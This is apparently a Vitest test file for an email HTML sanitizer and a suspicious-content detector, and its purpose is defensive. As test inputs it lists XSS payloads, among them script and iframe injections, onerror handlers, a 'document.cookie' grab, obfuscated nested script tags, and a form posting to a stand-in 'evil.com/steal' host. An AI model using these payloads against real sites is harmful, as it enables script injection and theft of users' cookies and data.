import { describe, expect, it } from "vitest";
import { containsSuspiciousContent, sanitizeForEmail } from "./html-sanitizer";

describe("html-sanitizer", () => {
	describe("sanitizeForEmail", () => {
		describe("malicious payload neutralization", () => {
			it("neutralizes script tags", () => {
				const input = "<script>alert('xss')</script>";
				const result = sanitizeForEmail(input);

				expect(result).not.toContain("<script");
				expect(result).not.toContain("</script>");
				expect(result).not.toContain("alert");
			});

			it("neutralizes script tags with attributes", () => {
				const input = '<script src="evil.js"></script>';
				const result = sanitizeForEmail(input);

				expect(result).not.toContain("<script");
				expect(result).not.toContain("evil.js");
			});

			it("neutralizes iframe with javascript protocol", () => {
				const input = '<iframe src="javascript:alert(1)"></iframe>';
				const result = sanitizeForEmail(input);

				expect(result).not.toContain("<iframe");
				expect(result).not.toContain("javascript:");
			});

			it("neutralizes iframe with data URL", () => {
				const input = '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>';
				const result = sanitizeForEmail(input);

				expect(result).not.toContain("<iframe");
				expect(result).not.toContain("<script");
			});

			it("neutralizes img tag with onerror handler", () => {
				const input = '<img onerror="alert(1)" src="x">';
				const result = sanitizeForEmail(input);

				expect(result).not.toContain("<img");
				expect(result).not.toContain("onerror");
				expect(result).not.toContain("alert");
			});

			it("neutralizes img tag with onload handler", () => {
				const input = '<img onload="malicious()" src="valid.jpg">';
				const result = sanitizeForEmail(input);

				expect(result).not.toContain("<img");
				expect(result).not.toContain("onload");
			});

			it("neutralizes anchor tags with javascript protocol", () => {
				const input = '<a href="javascript:alert(document.cookie)">Click me</a>';
				const result = sanitizeForEmail(input);

				expect(result).not.toContain("<a");
				expect(result).not.toContain("javascript:");
				expect(result).not.toContain("document.cookie");
			});

			it("neutralizes SVG with embedded script", () => {
				const input = '<svg onload="alert(1)"><script>evil()</script></svg>';
				const result = sanitizeForEmail(input);

				expect(result).not.toContain("<svg");
				expect(result).not.toContain("<script");
				expect(result).not.toContain("onload");
			});

			it("neutralizes event handlers in various tags", () => {
				const payloads = [
					'<div onclick="alert(1)">click</div>',
					'<body onload="alert(1)">',
					'<input onfocus="alert(1)" autofocus>',
					'<marquee onstart="alert(1)">',
					'<video onerror="alert(1)"><source src="x">',
				];

				for (const payload of payloads) {
					const result = sanitizeForEmail(payload);
					expect(result).not.toMatch(/on\w+=/i);
				}
			});

			it("neutralizes nested/obfuscated script tags", () => {
				const payloads = [
					"<scr<script>ipt>alert(1)</scr</script>ipt>",
					"<SCRIPT>alert(1)</SCRIPT>",
					"<script\n>alert(1)</script>",
					"<script\t>alert(1)</script>",
				];

				for (const payload of payloads) {
					const result = sanitizeForEmail(payload);
					expect(result.toLowerCase()).not.toContain("<script");
				}
			});

			it("neutralizes style-based attacks", () => {
				const input = '<style>body { background: url("javascript:alert(1)") }</style>';
				const result = sanitizeForEmail(input);

				expect(result).not.toContain("<style");
				expect(result).not.toContain("javascript:");
			});

			it("neutralizes object and embed tags", () => {
				const payloads = [
					'<object data="data:text/html,<script>alert(1)</script>">',
					'<embed src="javascript:alert(1)">',
				];

				for (const payload of payloads) {
					const result = sanitizeForEmail(payload);
					expect(result).not.toContain("<object");
					expect(result).not.toContain("<embed");
				}
			});

			it("neutralizes form-based attacks", () => {
				const input = '<form action="https://evil.com/steal"><input name="data"></form>';
				const result = sanitizeForEmail(input);

				expect(result).not.toContain("<form");
				expect(result).not.toContain("evil.com");
			});

			it("neutralizes meta refresh attacks", () => {
				const input = '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">';
				const result = sanitizeForEmail(input);

				expect(result).not.toContain("<meta");
				expect(result).not.toContain("javascript:");
			});
		});

		describe("legitimate input preservation", () => {
			it("preserves plain text input", () => {
				const input = "Hello, my name is John Doe.";
				const result = sanitizeForEmail(input);

				expect(result).toBe("Hello, my name is John Doe.");
			});

			it("preserves text with special characters", () => {
				const input = "Price: $100 & tax (10%)";
				const result = sanitizeForEmail(input);

				expect(result).toContain("$100");
				expect(result).toContain("10%");
			});

			it("preserves newlines and whitespace", () => {
				const input = "Line 1\nLine 2\n\nLine 4";
				const result = sanitizeForEmail(input);

				expect(result).toBe("Line 1\nLine 2\n\nLine 4");
			});

			it("preserves unicode characters", () => {
				const input = "Hello 世界! Привет мир! 🎉";
				const result = sanitizeForEmail(input);

				expect(result).toBe("Hello 世界! Привет мир! 🎉");
			});

			it("preserves email addresses", () => {
				const input = "Contact me at user@example.com";
				const result = sanitizeForEmail(input);

				expect(result).toBe("Contact me at user@example.com");
			});

			it("preserves URLs as plain text", () => {
				const input = "Visit https://example.com/path?query=value";
				const result = sanitizeForEmail(input);

				expect(result).toBe("Visit https://example.com/path?query=value");
			});

			it("encodes HTML entities while preserving meaning", () => {
				const input = "Use <code> tags for inline code";
				const result = sanitizeForEmail(input);

				// Tags should be stripped or escaped, text preserved
				expect(result).not.toContain("<code>");
				expect(result).toContain("tags for inline code");
			});
		});

		describe("edge cases", () => {
			it("handles empty string", () => {
				expect(sanitizeForEmail("")).toBe("");
			});

			it("handles null input", () => {
				expect(sanitizeForEmail(null as unknown as string)).toBe("");
			});

			it("handles undefined input", () => {
				expect(sanitizeForEmail(undefined as unknown as string)).toBe("");
			});

			it("handles very long input", () => {
				const input = "a".repeat(100000);
				const result = sanitizeForEmail(input);

				expect(result).toBe(input);
			});

			it("handles mixed legitimate and malicious content", () => {
				const input = "Hello John! <script>alert(1)</script> Thanks for reaching out.";
				const result = sanitizeForEmail(input);

				expect(result).toContain("Hello John!");
				expect(result).toContain("Thanks for reaching out.");
				expect(result).not.toContain("<script");
			});
		});
	});

	describe("containsSuspiciousContent", () => {
		it("detects script tags", () => {
			expect(containsSuspiciousContent("<script>alert(1)</script>")).toBe(true);
			expect(containsSuspiciousContent("<SCRIPT>")).toBe(true);
		});

		it("detects iframe tags", () => {
			expect(containsSuspiciousContent('<iframe src="x">')).toBe(true);
		});

		it("detects javascript protocol", () => {
			expect(containsSuspiciousContent("javascript:alert(1)")).toBe(true);
			expect(containsSuspiciousContent("JAVASCRIPT:")).toBe(true);
		});

		it("detects event handlers", () => {
			expect(containsSuspiciousContent("onclick=")).toBe(true);
			expect(containsSuspiciousContent("onerror=")).toBe(true);
			expect(containsSuspiciousContent("onload=")).toBe(true);
		});

		it("detects data URLs with HTML", () => {
			expect(containsSuspiciousContent("data:text/html,<script>")).toBe(true);
		});

		it("returns false for legitimate content", () => {
			expect(containsSuspiciousContent("Hello, world!")).toBe(false);
			expect(containsSuspiciousContent("Contact me at user@example.com")).toBe(false);
			expect(containsSuspiciousContent("The script ran successfully")).toBe(false);
		});

		it("handles edge cases", () => {
			expect(containsSuspiciousContent("")).toBe(false);
			expect(containsSuspiciousContent(null as unknown as string)).toBe(false);
			expect(containsSuspiciousContent(undefined as unknown as string)).toBe(false);
		});
	});
});
